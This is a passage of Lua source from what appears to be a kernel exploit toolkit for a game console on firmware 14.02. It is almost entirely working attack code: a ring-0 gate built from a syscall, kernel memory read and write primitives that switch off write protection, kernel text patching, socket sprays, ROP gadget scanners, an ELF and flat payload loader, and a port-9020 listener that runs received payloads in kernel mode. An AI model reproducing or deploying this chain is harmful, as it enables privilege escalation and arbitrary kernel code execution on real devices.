-- source at 0x7d000 bytes and a payload image does not fit.
function AG.need_syscalls(list)
    for _, name in ipairs(list) do
        if not syscall[name] then
            warn("this host has no syscall.%s", name)
            return false
        end
    end
    return true
end

function AG.listen_payload()
    if not AG.need_syscalls({"socket", "bind", "listen", "accept", "read", "close", "setsockopt"}) then return false end
    local port = AG.cfg.listen_port or 9020
    local max = AG.cfg.listen_max or 0x100000

    local fd = i32(syscall.socket(2, 1, 0))
    if fd < 0 then warn("listen: socket() failed"); return false end
    local one = AG.alloc(4)
    AG.wr4(one, 1)
    syscall.setsockopt(fd, 0xffff, 0x0004, one, 4)

    local sa = AG.alloc(16)
    AG.zero(sa, 16)
    AG.wr1(sa, 16)
    AG.wr1(sa + 1, 2)
    AG.wr1(sa + 2, math.floor(port / 256) % 256)
    AG.wr1(sa + 3, port % 256)
    local alen = AG.alloc(8)
    AG.wr4(alen, 16)

    if i32(syscall.bind(fd, sa, 16)) < 0 then warn("listen: bind %d failed: %s", port, get_error_string and get_error_string() or "?"); return false end
    if i32(syscall.listen(fd, 3)) < 0 then warn("listen: listen failed"); return false end
    log("listen: waiting for a payload on port %d", port)

    local cfd = i32(syscall.accept(fd, sa, alen))
    if cfd < 0 then warn("listen: accept failed"); return false end
    log("listen: connected (fd %d)", cfd)

    local buf = AG.alloc(max)
    AG.zero(buf, max)
    local got = 0
    while got < max do
        local n = i32(syscall.read(cfd, buf + got, math.min(0x10000, max - got)))
        if n <= 0 then break end
        got = got + n
    end
    syscall.close(cfd)
    syscall.close(fd)
    log("listen: received %d bytes", got)
    if got < 64 then warn("listen: payload looks empty"); return false end

    local libc = AG.find_libc()
    if not libc then warn("listen: no libc"); return false end
    AG.resolve_gadgets(libc.base)
    local r = AG.user_stage()
    if not r then return false end

    local kbase = r.base()
    if not kbase then warn("listen: could not read the kernel base"); return false end
    local pad_off = AG.padding or (FIRMWARE[AG.cfg.fw_override or "14.02"] or {}).padding
    if not pad_off then warn("listen: no padding offset"); return false end
    local pad = U(kbase) + pad_off
    log("listen: kernel base %s, padding %s", hexaddr(kbase), hexaddr(pad))

    local probe = AG.alloc(0x200)
    AG.zero(probe, 0x200)
    r.copy(probe, pad, 0x200, false)
    local raw = AG.rdbuf(probe, 0x200)
    local stub = nil
    for off = 0, 0x1c0, 8 do
        local ok = true
        for k = 0, 15 do
            if raw:byte(off + k + 1) ~= 0 then ok = false; break end
        end
        if ok then stub = pad + off; break end
    end
    if not stub then warn("listen: no zero run in the padding"); return false end

    local code = AG.alloc(0x20)
    local w = AG.code_at(code, 0)
    w:hex("48b8"):qw(buf)
    w:hex("ffd0")
    w:hex("c3")
    r.copy(stub, code, 12, true)
    log("listen: stub written at %s", hexaddr(stub))

    local body = r.begin()
    body:hex("48b8"):qw(stub)
    body:hex("ffd0")
    log("listen: entering the payload through the kernel stub")
    local ok = r.run()
    log("listen: back from the payload (gate returned: %s)", tostring(ok))
    return ok
end

-- Flat images (goldhen.bin) are position independent machine code with
-- entry at offset 0 and no headers to parse.
function AG.kexec_flat()
    local b64 = AG.cfg.payload_b64
    if not b64 then warn("flat: payload_b64 is empty"); return false end

    local libc = AG.find_libc()
    if not libc then warn("flat: no libc"); return false end
    AG.resolve_gadgets(libc.base)

    local image = AG.a85decode(b64, AG.cfg.payload_len)
    log("flat: %s -- %d bytes", tostring(AG.cfg.payload_name), #image)
    if #image < 64 then warn("flat: image is too small"); return false end

    local span = math.floor((#image + 0x1fff) / 0x1000) * 0x1000
    local at = U(syscall.mmap(0, span, 7, 0x1002, -1, 0))
    if at.l == 0 or (at.h ~= 0 and at.h >= 0xffff0000) then
        warn("flat: mmap 0x%x failed", span); return false
    end
    AG.wrbuf(at, image)
    log("flat: loaded at %s..%s, entry %s", hexaddr(at), hexaddr(at + span), hexaddr(at))

    local r = AG.user_stage()
    if not r then return false end

    local kbase = r.base()
    if not kbase then warn("flat: could not read the kernel base"); return false end
    local pad_off = AG.padding or (FIRMWARE[AG.cfg.fw_override or "14.02"] or {}).padding
    if not pad_off then warn("flat: no padding offset for this firmware"); return false end
    local pad = U(kbase) + pad_off
    log("flat: kernel base %s, padding %s", hexaddr(kbase), hexaddr(pad))

    local probe = AG.alloc(0x200)
    AG.zero(probe, 0x200)
    r.copy(probe, pad, 0x200, false)
    local raw = AG.rdbuf(probe, 0x200)
    local stub = nil
    for off = 0, 0x1c0, 8 do
        local ok = true
        for k = 0, 15 do
            if raw:byte(off + k + 1) ~= 0 then ok = false; break end
        end
        if ok then stub = pad + off; break end
    end
    if not stub then warn("flat: no zero run in the padding"); return false end

    local code = AG.alloc(0x20)
    local w = AG.code_at(code, 0)
    w:hex("48b8"):qw(at)
    w:hex("ffd0")
    w:hex("c3")
    r.copy(stub, code, 12, true)
    log("flat: calling stub written at %s", hexaddr(stub))

    local body = r.begin()
    body:hex("48b8"):qw(stub)
    body:hex("ffd0")
    log("flat: entering the payload through the kernel stub")
    local ok = r.run()
    log("flat: back from the payload (gate returned: %s)", tostring(ok))
    return ok
end

function AG.kexec_payload()
    local b64 = AG.cfg.payload_b64
    if not b64 then warn("kexec: payload_b64 is empty"); return false end

    local libc = AG.find_libc()
    if not libc then warn("kexec: no libc"); return false end
    AG.resolve_gadgets(libc.base)

    local r = AG.user_stage()
    if not r then return false end

    log("kexec: decoding %s payload (%d base64 chars)", tostring(AG.cfg.payload_name), #b64)
    local image = AG.a85decode(b64, AG.cfg.payload_len)
    log("kexec: %d bytes", #image)
    local entry, why = AG.load_elf(image)
    if not entry then warn("kexec: %s", tostring(why)); return false end
    log("kexec: entry %s -- jumping from ring 0", hexaddr(entry))

    local body = r.begin()
    body:hex("48b8"):qw(entry)
    body:hex("ffd0")
    if r.run() then
        log("kexec: the payload's entry returned -- it ran in ring 0")
    else
        log("kexec: the payload's entry did not come back through the gate")
    end
    return true
end

function AG.elf_selftest()
    local libc = AG.find_libc()
    if not libc then warn("elf: no libc"); return false end
    AG.resolve_gadgets(libc.base)
    local r = AG.user_stage()
    if not r then return false end
    AG.wr4(r.at + FLAG + 8, 0)

    local SIG2 = 0xE1F00001
    local flag_at = U(r.at) + (FLAG + 8)
    local code = fromhex("48b8") .. leU(flag_at)
        .. fromhex("c700") .. le32(SIG2) .. fromhex("31c0c3")

    local ehdr = fromhex("7f454c46") .. string.char(2, 1, 1, 9) .. string.rep("\0", 8)
        .. le16(2) .. le16(0x3e) .. le32(1)
        .. le64(0) .. le64(64) .. le64(0) .. le32(0)
        .. le16(64) .. le16(56) .. le16(1) .. le16(0) .. le16(0) .. le16(0)
    local phdr = le32(1) .. le32(7) .. le64(0x1000) .. le64(0) .. le64(0)
        .. le64(#code) .. le64(#code) .. le64(0x1000)
    local image = ehdr .. phdr
    image = image .. string.rep("\0", 0x1000 - #image) .. code

    log("elf: built %d byte image in memory", #image)

    do
        local probe = io.open("/savedata0/main.lua", "rb")
        if probe then
            local got = probe:read("*a")
            probe:close()
            log("elf: file reads work (%d bytes from /savedata0/main.lua)",
                type(got) == "string" and #got or -1)
        else
            log("elf: file reads are NOT available in this process")
        end
    end

    local entry, why = AG.load_elf(image)
    if not entry then warn("elf: %s", tostring(why)); return false end
    log("elf: entry %s", hexaddr(entry))

    local body = r.begin()
    body:hex("48b8"):qw(entry)
    body:hex("ffd0")

    if r.run() and AG.rd4(r.at + FLAG + 8) % 2^32 == SIG2 then
        log("elf: loaded ELF ran in ring 0 and returned cleanly")
        return true
    end
    warn("elf: the loaded ELF did not run")
    return false
end

-- syscall 11 is the gate. The kernel leaves the argument array in rsi and
-- jumps through `jmp [rsi]`, so arg0 is the address of the code to run:
-- anything written here executes in ring 0 and returns with `ret`.
function AG.open_ring0(room_at)
    local at = U(room_at)
    local r = { at = at, gate = at + GATE, gate_at = at + GATE, body_at = at + BODY }

    AG.code_at(at, GATE):hex("4831c0"):hex("4989ca"):hex("0f05"):hex("c3")

    local body = AG.code_at(at, BODY)

    function r.begin() return body:reset() end

    function r.run()
        body:hex("48b8"):qw(at + FLAG):hex("c700"):dw(SIGIL):hex("31c0"):hex("c3")
        AG.wr4(at + FLAG, 0)
        call(r.gate, 11, at + BODY)
        return AG.rd4(at + FLAG) % 2^32 == SIGIL
    end

    function r.out() return AG.rd8(at + OUT) end

    function r.thread()
        r.begin():hex("48ba"):qw(at + OUT):hex("48893a")
        if r.run() then return r.out() end
        return nil
    end

    function r.base()
        local c = r.begin()
        c:hex("b9"):dw(0xc0000082):hex("0f32")
        c:hex("48c1e220"):hex("89c0"):hex("4809c2")
        c:hex("48b8"):qw(at + OUT):hex("488910")
        if r.run() then return plus(r.out(), -0x1c0) end
        return nil
    end

    function r.copy(dst, src, len, guarded)
        local c = r.begin()
        if guarded then c:hex("0f20c0"):hex("4825"):dw(0xfffeffff):hex("0f22c0") end
        c:hex("48bf"):qw(dst)
        c:hex("48be"):qw(src)
        c:hex("48b9"):qw(uint64(len))
        c:hex("fc"):hex("f3a4")
        if guarded then c:hex("0f20c0"):hex("480d"):dw(0x00010000):hex("0f22c0") end
        return r.run()
    end

    function r.apply(base, list)
        local c = r.begin()
        c:hex("48b9"):qw(base)
        c:hex("0f20c0"):hex("4825"):dw(0xfffeffff):hex("0f22c0")
        for _, p in ipairs(list) do
            local bytes = hex_to_binary(p[2])
            if #bytes == 1 then c:hex("c681")
            elseif #bytes == 2 then c:hex("66c781")
            else c:hex("c781") end
            c:dw(p[1])
            c:imm(bytes)
        end
        c:hex("0f20c0"):hex("480d"):dw(0x00010000):hex("0f22c0")
        return r.run()
    end

    function r.read(kaddr, len)
        len = len or 8
        if not r.copy(at + STAGE, kaddr, len, false) then return nil end
        return AG.rdbuf(at + STAGE, len)
    end

    function r.read_v(kaddr)
        local s = r.read(kaddr, 8)
        if not s then return nil end
        return qw(s, 0)
    end

    function r.write(kaddr, bytes)
        AG.wrbuf(at + STAGE, bytes)
        return r.copy(kaddr, at + STAGE, #bytes, true)
    end

    function r.write_v(kaddr, q)
        return r.write(kaddr, ub8(uint64(q)))
    end

    function r.exec(kaddr)
        AG.wr4(at + FLAG, 0)
        call(r.gate, 11, kaddr)
        return true
    end

    return r
end

local OFF_STUB   = 0x100
local OFF_DEVS   = 0x110
local OFF_QUEUES = 0x170
local RET0       = 0x00c3c031

function AG.attach_teardown_loops(k, room_at)
    local room = U(room_at)

    function k.rehang(ofs, list, from, copy)
        if #list == 0 or #list > 256 or from == nil then return nil end
        for i = 1, #list do AG.wr4(room + STAGE + (i - 1) * 4, list[i]) end
        local b = k.begin()
        b:hex("31c0")
        b:hex("48be"):qw(room + STAGE)
        b:hex("48b9"):qw(uint64(#list))
        b:hex("49b8"):qw(ofs)
        b:hex("49b9"):qw(from)
        b:hex("49ba"):qw(copy)
        b:hex("4885c9"):hex("7421"):hex("486316"):hex("4883c604"):hex("48ffc9")
        b:hex("4d8b1cd0"):hex("4d85db"):hex("74e8"):hex("4d394b08"):hex("75e2")
        b:hex("4d895308"):hex("ffc0"):hex("ebda")
        b:hex("48ba"):qw(room + OUT):hex("488902")
        if not k.run() then return nil end
        return AG.rd4(room + OUT)
    end

    function k.count_off(ofs, list, copy)
        if #list == 0 or #list > 256 then return nil end
        for i = 1, #list do AG.wr4(room + STAGE + (i - 1) * 4, list[i]) end
        local b = k.begin()
        b:hex("31c0")
        b:hex("48be"):qw(room + STAGE)
        b:hex("48b9"):qw(uint64(#list))
        b:hex("49b8"):qw(ofs)
        b:hex("49ba"):qw(copy)
        b:hex("4885c9"):hex("741d"):hex("486316"):hex("4883c604"):hex("48ffc9")
        b:hex("4d8b1cd0"):hex("4d85db"):hex("7406"):hex("4d395308"):hex("74e2")
        b:hex("ffc0"):hex("ebde")
        b:hex("48ba"):qw(room + OUT):hex("488902")
        if not k.run() then return nil end
        return AG.rd4(room + OUT)
    end
end

function AG.teardown(k, kbase, ofs, devs, queues, room_at)
    local function kat(rva) return U(kbase) + rva end
    local function file_of(fd) return k.read_v(plus(ofs, fd * 8)) end

    local stub = kat(AG.padding + OFF_STUB)
    local dtab = kat(AG.padding + OFF_DEVS)
    local qtab = kat(AG.padding + OFF_QUEUES)

    log("[t] reading the padding at %s", hexaddr(stub))
    local there = k.read_v(stub)
    if there == nil then
        warn("[t] kernel text not readable at %s", hexaddr(stub))
        return false
    end
    log("[t] it holds %s", hexaddr(there))
    if (there.l % 2^32) == RET0 then
        log("[t] the stub is already there from an earlier run")
    elseif zero(there) then
        if not k.write_v(stub, U64(RET0, 0)) then
            warn("[t] kernel text not writable")
            return false
        end
        local back = k.read_v(stub)
        if not (back and (back.l % 2^32) == RET0) then
            warn("[t] the stub did not stick")
            return false
        end
    else
        warn("[t] something else is at %s: %s", hexaddr(stub), hexaddr(there))
        return false
    end

    local function clone_table(from, to, what)
        for i = 0, 10 do
            local q = k.read_v(from + i * 8)
            if q == nil then
                warn("[t] %s unreadable at +0x%x", what, i * 8)
                return false
            end
            if i == 7 then q = stub end
            k.write_v(to + i * 8, q)
        end
        local c = k.read_v(to + 0x38)
        return c ~= nil and same(c, stub)
    end

    local function original(list, copy)
        for i = 1, #list do
            local f = file_of(list[i])
            if f and in_heap(f) then
                local cur = k.read_v(f + 0x08)
                if cur and in_text(cur) and not same(cur, copy) then return cur end
            end
        end
        return nil
    end

    local function ready(copy)
        local c = k.read_v(copy + 0x38)
        return c ~= nil and same(c, stub)
    end

    local function rehang_one(list, from, copy)
        local moved = 0
        for i = 1, #list do
            local f = file_of(list[i])
            local cur = (f and in_heap(f)) and k.read_v(f + 0x08) or nil
            if cur and same(cur, copy) then
                moved = moved + 1
            elseif cur and from and same(cur, from) and k.write_v(f + 0x08, copy) then
                moved = moved + 1
            end
        end
        return moved
    end

    log("[t] looking for the device table across %d handles", #devs)
    local devOps = original(devs, dtab)
    if devOps then
        if not ready(dtab) and not clone_table(devOps, dtab, "device table") then return false end
    elseif not ready(dtab) then
        warn("[t] no device table to copy -- nothing done")
        return false
    end

    local moved = k.rehang(ofs, devs, devOps, dtab)
    if moved == nil then
        log("[t] rehanging one at a time")
        moved = rehang_one(devs, devOps, dtab)
    end
    log("[t] %d of %d handles on the copy", moved, #devs)

    local movedq = 0
    if queues and #queues > 0 then
        local qOps = original(queues, qtab)
        if qOps and not same(qOps, devOps or qtab) then
            if ready(qtab) or clone_table(qOps, qtab, "queue table") then
                movedq = rehang_one(queues, qOps, qtab)
            end
        elseif ready(qtab) then
            movedq = #queues
        end
    end
    log("[t] %d of %d queues on the copy", movedq, queues and #queues or 0)

    local notes = 0
    for i = 1, (queues and #queues or 0) do
        local f = file_of(queues[i])
        if f and in_heap(f) then
            local kq = k.read_v(f)
            if kq and in_heap(kq) then
                local w = k.read_v(kq + 0xa0)
                if w then
                    if (w.h % 2^32) ~= 0 then
                        if k.write_v(kq + 0xa0, U64(w.l, 0)) then notes = notes + 1 end
                    else
                        notes = notes + 1
                    end
                end
            end
        end
    end
    log("[t] note lists emptied on %d of %d queues", notes, queues and #queues or 0)

    local left = k.count_off(ofs, devs, dtab)
    if left == nil then
        left = 0
        for i = 1, #devs do
            local f = file_of(devs[i])
            local cur = (f and in_heap(f)) and k.read_v(f + 0x08) or nil
            if not (cur and same(cur, dtab)) then left = left + 1 end
        end
    end
    if left == 0 and moved > 0 then
        log("[t] all %d handles are on the copy", #devs)
        return true
    end
    warn("[t] %d handles are still on the original -- do not let this process exit", left)
    return false
end

function AG.list_modules()
    local ok1, get_list_addr = pcall(dlsym, LIBKERNEL_HANDLE, "sceKernelGetModuleListInternal")
    local ok2, get_info_addr = pcall(dlsym, LIBKERNEL_HANDLE, "sceKernelGetModuleInfo")
    if not (ok1 and ok2 and get_list_addr and get_info_addr) then return {} end

    local get_list = fcall(get_list_addr)
    local get_info = fcall(get_info_addr)

    local list = AG.alloc(4 * 0x300)
    local num = AG.alloc(8)
    AG.wr8(num, 0)
    get_list(list, 0x300, num)
    local n = AG.rd8(num):tonumber()
    if not n or n <= 0 or n > 0x300 then return {} end

    local out = {}
    for i = 0, n - 1 do
        local handle = memory.read_dword(list + i * 4):tonumber()
        local info = AG.alloc(0x160)
        AG.zero(info, 0x160)
        AG.wr8(info, 0x160)
        if get_info(handle, info):tonumber() == 0 then
            local base = AG.rd8(info + 0x108)
            if base and not zero(base) then
                local name = memory.read_null_terminated_string(info + 8) or "?"
                table.insert(out, { handle = handle, base = base, name = name })
            end
        end
    end
    return out
end

function AG.probe()
    local out = { ok = false, reasons = {} }
    local function no(why)
        table.insert(out.reasons, why)
        warn("BLOCKED %s", why)
    end

    local fw = AG.cfg.fw_override or FW_VERSION
    out.fw = tostring(fw)
    if not FIRMWARE[fw] then
        if fw == nil then
            warn("this host does not set FW_VERSION -- set cfg.fw_override")
        else
            warn("no kernel stage for firmware %s -- refusing", tostring(fw))
        end
        warn("this build carries: %s", table.concat(AG.supported_fws(), ", "))
        no("unsupported firmware " .. tostring(fw))
        return out
    end
    log("probe firmware %s, platform %s", tostring(fw), tostring(PLATFORM))
    log("probe stages  %d: %s", #AG.supported_fws(), table.concat(AG.supported_fws(), " "))

    local missing = AG.resolve_syscalls()
    out.stubs = (#missing == 0) and "all resolved" or ("missing " .. table.concat(missing, ","))
    log("probe stubs   %s", out.stubs)
    if #missing > 0 then no("no libkernel stub for syscall " .. table.concat(missing, ",")) end

    local lib = AG.find_libc()
    out.libc = lib.base and (hexaddr(lib.base) .. " via " .. tostring(lib.at)) or "not found"
    out.modules = lib.count or 0
    log("probe libc    %s", out.libc)
    if not lib.base then
        no(lib.note or "libSceLibcInternal is not mapped")
        return out
    end

    if libc_addrofs and libc_addrofs.longjmp then
        local lj = uint64(libc_addrofs.longjmp)
        local ok, b = pcall(AG.rdbuf, lj, 0x60)
        if ok and b then
            log("probe longjmp %s", hexaddr(lj))
            log("      %s", bin_to_hex(b))
        else
            log("probe longjmp read failed")
        end
    end

    local g, gmiss = AG.resolve_gadgets(lib.base)
    if g then
        out.gadgets = gmiss and ("missing " .. tostring(gmiss)) or "all present"
    else

        out.gadgets = "not scanned: " .. tostring(gmiss)
    end
    log("probe gadget  %s", out.gadgets)
    if AG.libc_scan then
        out.span = string.format("%d bytes (%s)", AG.libc_scan.size, tostring(AG.libc_scan.how))
        log("probe span    %s", out.span)
    else
        out.span = "unknown"
        log("probe span    unknown")
    end
    if not g then
        no("cannot scan libc: " .. tostring(gmiss))
    elseif gmiss then
        no("gadget " .. tostring(gmiss) .. " is missing -- different libc build")
    end

    local room = g and AG.find_room(lib) or nil
    if room then
        out.room = string.format("%s free %s, %d bytes",
            hexaddr(room.page), hexaddr(room.free), (room.last - room.free):tonumber())
    else
        out.room = "none"
    end
    log("probe room    %s", out.room)
    if g and not room then no("no zeroed executable page behind libc text") end

    local node = nil
    for _, p in ipairs(AG.cfg.probe_nodes) do
        local fd = i32(syscall.open(p, 0))
        if fd >= 0 then
            node = p
            syscall.close(fd)
            break
        end
    end
    out.probeNode = node or "none"
    log("probe node    %s", out.probeNode)
    if not node then no("no usable device node for the probe descriptor") end

    local held = {}
    for _ = 1, 20 do
        local fd = i32(syscall.open("/dev/apm", 0))
        if fd < 0 then break end
        table.insert(held, fd)
    end
    out.apm = (#held > 0) and (#held .. " clones held") or ("refused, errno " .. errno_str())
    log("probe apm     %s", out.apm)
    if #held == 0 then no("/dev/apm cannot be opened in this sandbox") end

    local openu, refused = {}, {}
    for u = 0, 31 do
        local fd = i32(syscall.open("/dev/apm" .. u, 0))
        if fd >= 0 then
            table.insert(openu, u)
            syscall.close(fd)
        elseif #refused < 3 then
            table.insert(refused, u .. ":e" .. errno_str())
        end
    end
    out.units = #openu
    out.unitList = (#openu > 0) and table.concat(openu, ",") or "none"
    out.unitRefused = (#refused > 0) and table.concat(refused, " ") or "-"
    log("probe units   %d open: %s", out.units, out.unitList)
    log("probe refused %s", out.unitRefused)
    if #openu < 3 then no("only " .. #openu .. " apm units with " .. #held .. " clones held") end

    local pin = AG.pin_core()
    out.pin = pin.ok and string.format("core %d of [%s]", pin.core, pin.allowed) or ("FAILED: " .. pin.note)
    log("probe pin     %s", out.pin)
    if not pin.ok then no("cannot pin to a cpu: " .. pin.note) end
    if pin.ok then AG.unpin(pin) end

    local q = i32(syscall.kqueue())
    local kv = nil
    if q >= 0 then kv = i32(syscall.kevent(q, 0, 0, 0, 0, 0)) end
    out.kqueue = (q >= 0) and ("fd " .. q .. ", no-op kevent rv " .. tostring(kv))
        or ("refused, errno " .. errno_str())
    log("probe kqueue  %s", out.kqueue)
    if q < 0 then no("kqueue() refused")
    elseif kv == nil or kv < 0 then no("kevent() no-op refused") end
    if q >= 0 then syscall.close(q) end

    local socks = {}
    for _ = 1, TUNE.sprays do
        local fd = i32(syscall.socket(2, 2, 0))
        if fd < 0 then break end
        table.insert(socks, fd)
    end
    out.udp = #socks
    log("probe UDP     %d of %d needed", #socks, TUNE.sprays)

    if #socks > 0 then
        local body = AG.alloc(TUNE.object)
        AG.zero(body, TUNE.object)
        local req = AG.alloc(40)
        AG.wr4(req + 0, 1)
        AG.wr8(req + 8, AG.alloc(16))
        AG.wr4(req + 16, 16)
        AG.wr8(req + 24, body)
        AG.wr4(req + 32, TUNE.object)

        local t0 = now_ms()
        collectgarbage("stop")
        for i = 1, #socks do syscall.setsockopt(socks[i], 17, 128, req, 40) end
        collectgarbage("restart")
        local t1 = now_ms()
        local t2 = now_ms()
        collectgarbage("stop")
        for i = 1, #socks do syscall.setsockopt(socks[i], 17, 128, req, 40) end
        collectgarbage("restart")
        local t3 = now_ms()
        local warm = t3 - t2
        out.window = string.format("cold %.2f ms, warm %.2f ms for %d calls (%.0f us each)",
            t1 - t0, warm, #socks, (warm * 1000) / #socks)
    else
        out.window = "not measured"
    end
    log("probe window  %s", out.window)

    do
        local n = 126
        local a0 = now_ms()
        for _ = 1, n do syscall.getuid() end
        local a1 = now_ms()
        collectgarbage("stop")
        local a2 = now_ms()
        for _ = 1, n do syscall.getuid() end
        local a3 = now_ms()
        collectgarbage("restart")
        out.cost = string.format("getuid %.0f us/call, %.0f us/call with gc off",
            (a1 - a0) * 1000 / n, (a3 - a2) * 1000 / n)
        log("probe cost    %s", out.cost)

    do
        local a = now_ms()
        sleep(0.1)
        local b = now_ms()
        out.clock = string.format("%.1f ms for a 100 ms sleep -> %s time",
            b - a, ((b - a) > 50) and "wall" or "cpu")
        log("probe clock   %s", out.clock)
    end

    do
        local best, bestcore = nil, nil
        local list = {}
        local cores = AG.cached_cores or {}
        for _, core in ipairs(cores) do
            local pin = AG.pin_to(core)
            if pin then
                local t0 = now_ms()
                for _ = 1, 32 do syscall.getuid() end
                local t1 = now_ms()
                local per = (t1 - t0) * 1000 / 32
                table.insert(list, string.format("core%d=%.0fus", core, per))
                if not best or per < best then best, bestcore = per, core end
            end
        end
        AG.unpin_all(cores)
        out.corecost = table.concat(list, " ")
        out.bestcore = bestcore
        log("probe cores   %s  -> best core %s", out.corecost, tostring(bestcore))
    end
    end

    for i = 1, #socks do syscall.close(socks[i]) end
    if #socks < TUNE.sprays then
        no("only " .. #socks .. " udp sockets, " .. TUNE.sprays .. " is a hard floor")
    end

    log("probe SHOTS   %d units, a run needs 4", out.units or 0)
    out.ok = (#out.reasons == 0)
    AG.on_screen(out.ok and "probe usable" or ("probe blocked: " .. table.concat(out.reasons, "; ")))
    if out.ok then
        log("probe VERDICT usable")
    else
        warn("probe VERDICT blocked: %s", table.concat(out.reasons, "; "))
    end
    return out
end

function AG.find_libc()
    local r = { base = nil, count = 0, at = nil, note = nil, handle = nil }

    if libc_base and not zero(libc_base) then
        r.base = uint64(libc_base)
        r.at = "loader libc_base"
    end

    local ok, mod = pcall(find_mod_by_name, "libSceLibcInternal.sprx")
    if ok and mod then
        r.handle = mod.handle
        if not r.base and not zero(mod.base_addr) then
            r.base = uint64(mod.base_addr)
            r.at = "module list"
        end
    end

    if not r.base then
        r.note = "libSceLibcInternal is not mapped (the loader has no libc_base either)"
    end
    return r
end

function AG.libc_text(libc)
    libc = U(libc)
    local hdr = AG.rdbuf(libc, 0x40)
    if hdr:sub(1, 4) ~= "\127ELF" then

        return nil, "no ELF header at " .. hexaddr(libc)
    end

    local e_phoff = qw(hdr, 0x20):tonumber()
    local e_phentsize = memory.read_word(libc + 0x36):tonumber()
    local e_phnum = memory.read_word(libc + 0x38):tonumber()

    if e_phnum <= 0 or e_phnum > 32 or e_phentsize < 0x38 then
        return nil, "implausible program header count " .. tostring(e_phnum)
    end

    local best = nil
    for i = 0, e_phnum - 1 do
        local ph = libc + e_phoff + i * e_phentsize
        local p_type = AG.rd4(ph + 0)
        local p_flags = AG.rd4(ph + 4)
        local p_vaddr = AG.rd8(ph + 0x10)
        local p_memsz = AG.rd8(ph + 0x28)

        if p_type == 1 and (p_flags % 2) == 1 and p_memsz:tonumber() > 0 then
            best = { start = libc + p_vaddr, size = p_memsz:tonumber() }
        end
    end
    if not best then
        return nil, "no executable PT_LOAD in libc"
    end
    if best.size > 0x800000 then best.size = 0x800000 end
    return best
end

function AG.libc_window(libc, lib)
    libc = U(libc)
    local span_start, span_end, span_prot = AG.mapping_span(libc)
    if span_start then

        return (span_end - libc):tonumber(),
            string.format("vmmap %s..%s", hexaddr(span_start), hexaddr(span_end))
    end

    local seg, why = AG.libc_text(libc)
    if seg then return seg.size, "ELF p_memsz" end

    local handle = lib and lib.handle or nil
    if not handle then
        local l = AG.find_libc()
        handle = l.handle
    end
    local mi = AG.module_segment(handle, libc)
    if mi then return mi.size, string.format("module info +0x%x", mi.at) end

    return nil, "cannot bound the libc scan (" .. tostring(why) .. ")"
end

function AG.mapping_span(addr)
    local maps, why = AG.vmmap()
    if not maps then return nil, nil, nil, why end
    addr = U(addr)
    for _, e in ipairs(maps) do
        local s, u = e.start, e.stop
        if (s.h < addr.h or (s.h == addr.h and s.l <= addr.l))
            and (addr.h < u.h or (addr.h == u.h and addr.l < u.l)) then
            return s, u, e.prot
        end
    end
    return nil, nil, nil, "no mapping covers " .. hexaddr(addr)
end

function AG.module_segment(handle, base)
    if not handle then return nil end
    base = U(base)
    local ok, get_info = pcall(dlsym, LIBKERNEL_HANDLE, "sceKernelGetModuleInfo")
    if not ok or not get_info then return nil end
    local fn = fcall(get_info)
    local info = AG.alloc(0x160)
    AG.zero(info, 0x160)
    AG.wr8(info, 0x160)
    if fn(handle, info):tonumber() ~= 0 then return nil end

    for o = 0, 0x160 - 0x10, 8 do
        local v = AG.rd8(info + o)
        if v and v.h == base.h and v.l == base.l then
            local sz = AG.rd4(info + o + 8)
            if sz and sz > 0x1000 and sz <= 0x800000 then
                return { at = o, size = sz }
            end
        end
    end
    return nil
end

local POP_NAMES = { "rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi" }

-- Only gadgets whose tail pops nothing but scratch registers are used:
-- the chain returns with `leave`, which needs the kernel's own rbp.
function AG.scan_pop(text, opcode, from)
    local pos = from or 1
    while true do
        local at = text:find(string.char(opcode), pos, true)
        if not at then return nil end
        local extra, i, ok, bad = 0, at + 1, false, false
        local names = {}
        while i <= at + 20 do
            local c = text:byte(i)
            if not c then break end
            if c >= 0x58 and c <= 0x5f then
                if c == 0x5c or c == 0x5d then bad = true end
                names[#names + 1] = POP_NAMES[c - 0x57]
                extra = extra + 1
                i = i + 1
            elseif c == 0x90 then
                i = i + 1
            elseif c == 0x41 and text:byte(i + 1) and text:byte(i + 1) >= 0x58
                   and text:byte(i + 1) <= 0x5f then
                names[#names + 1] = "r" .. (8 + (text:byte(i + 1) - 0x58))
                extra = extra + 1
                i = i + 2
            elseif c == 0xc3 then ok = true; break
            else break end
        end
        if ok and not bad and (at - 1) >= MIN_GADGET_OFF then
            return at, extra, table.concat(names, ",")
        end
        pos = at + 1
    end
end

function AG.scan_seq(text, prefix_hex, from)
    local bin = hex_to_binary(prefix_hex)
    local pos = from or 1
    while true do
        local at = text:find(bin, pos, true)
        if not at then return nil end
        local extra, i, ok, bad = 0, at + #bin, false, false
        while i <= at + #bin + 20 do
            local c = text:byte(i)
            if not c then break end
            if c >= 0x58 and c <= 0x5f then
                if c == 0x5c or c == 0x5d then bad = true end
                extra = extra + 1; i = i + 1
            elseif c == 0x90 then
                i = i + 1
            elseif c == 0x41 and text:byte(i + 1) and text:byte(i + 1) >= 0x58
                   and text:byte(i + 1) <= 0x5f then
                extra = extra + 1; i = i + 2
            elseif c == 0xc3 then ok = true; break
            else break end
        end
        if ok and not bad and (at - 1) >= MIN_GADGET_OFF then return at, extra end
        pos = at + 1
    end
end

local function rd32le(str, pos)
    local a, b, c, d = str:byte(pos), str:byte(pos + 1), str:byte(pos + 2), str:byte(pos + 3)
    if not (a and b and c and d) then return nil end
    return a + b * 0x100 + c * 0x10000 + d * 0x1000000
end

function AG.find_restore(text)
    local prefix = hex_to_binary("488ba7")
    local pos = 1
    while true do
        local at = text:find(prefix, pos, true)
        if not at then return nil end
        local rsp_disp = rd32le(text, at + 3)
        if rsp_disp and rsp_disp <= 0x1000 and (at - 1) >= MIN_GADGET_OFF then
            local i = at + 7

            local pending, rip_disp, pushed, ok, steps = nil, nil, false, false, 0
            while steps < 16 do
                local b = text:byte(i)
                if not b then break end
                local b2, b3 = text:byte(i + 1), text:byte(i + 2)
                if b == 0xc3 then ok = true; break
                elseif b == 0x51 then
                    if pending then rip_disp = pending end
                    pushed = true
                    i = i + 1
                elseif b == 0x48 and b2 == 0x8b and b3 == 0x8f then
                    pending = rd32le(text, i + 3); i = i + 7
                elseif b == 0x48 and b2 == 0x8b and b3 == 0x4f then
                    pending = text:byte(i + 3); i = i + 4
                elseif b == 0x48 and b2 == 0x8b and b3 == 0x7f then
                    i = i + 4
                elseif b == 0x48 and b2 == 0x8b and b3 == 0xbf then
                    i = i + 7
                else break end
                steps = steps + 1
            end
            if ok and pushed and rip_disp then
